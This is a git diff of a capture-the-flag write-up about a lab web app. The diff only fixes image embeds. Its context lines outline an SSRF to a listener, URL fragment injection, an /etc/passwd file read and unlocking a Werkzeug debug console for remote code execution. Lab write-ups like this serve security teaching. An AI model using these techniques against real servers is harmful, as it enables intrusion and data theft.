@@ -35,7 +35,7 @@ This can be easily tested, you open a web server with python for example like th
 python -m http.server 1234
 ```
 
-[http_server_running](/images/thm/plantPhotographer/1_http_server_running.png)
+![http_server_running](/images/thm/plantPhotographer/1_http_server_running.png)
 and then we just need to modify the url from before so it looks like this:
 
 ```
@@ -44,7 +44,7 @@ http://10.129.128.148/download?server=http://<YOUR_IP>:1234&id=75482342
 
 If you send the request you will see the response in your http listener.
 
-[get_ssrf_request](/images/thm/plantPhotographer/2_get_ssrf_request.png)
+![get_ssrf_request](/images/thm/plantPhotographer/2_get_ssrf_request.png)
 
 The first flag should be in the request headers, so you will have to read the headers, you can do that easily with this python snippet.
 
@@ -69,7 +69,7 @@ server.serve_forever()
 
 All the headers will be printed to stdout on every requests so, just like that, we get the first flag:
 
-[first_flag](/images/thm/plantPhotographer/3_get_request_with_headers)
+![first_flag](/images/thm/plantPhotographer/3_get_request_with_headers)
 
 ### Second flag
 
@@ -105,7 +105,7 @@ We succesfully "injected" the "#" character into the url so it will be ignored b
 
 If everything worked fine, you should download a image file containing the flag:
 
-[admin_flag](/images/thm/plantPhotographer/4_admin_flag.png)
+![admin_flag](/images/thm/plantPhotographer/4_admin_flag.png)
 ### Third flag
 
 Alright for the final flag we are being told that there is a txt file in the root of the webserver that contains the last flag how do we get it?
@@ -120,7 +120,7 @@ You should get the content of the /etc/passwd file which proofs that we have LFI
 
 So what can we do? While i was testing things for getting the second flag i was able to trigger ( multiple times ) and error in the server that gave me the error traceback which spits a bunch of information look at the image:
 
-[error_message](/images/thm/plantPhotographer/5_error_message.png)
+![error_message](/images/thm/plantPhotographer/5_error_message.png)
 
 in this case i added alphabetic characters into the **id** parameter which throws and error while trying to convert them to **integers**. As you can see in the traceback is giving you a bunch of interesting paths that will be used later.
 
@@ -305,9 +305,9 @@ print(rv)
 
 Once we get our pin we go to the endpoint **/console** in the server and we enter the pin:
 
-[pin_code](/images/thm/plantPhotographer/6_pin_code_console.png)
+![pin_code](/images/thm/plantPhotographer/6_pin_code_console.png)
 
-[console_unlocked](/images/thm/plantPhotographer/7_console_unlocked.png)
+![console_unlocked](/images/thm/plantPhotographer/7_console_unlocked.png)
 
 And pum! We get access to the console we now basically have RCE, i'll leave you on your own for this last part ( you only need to read the file that is sitting in the root of the webserver ).
 
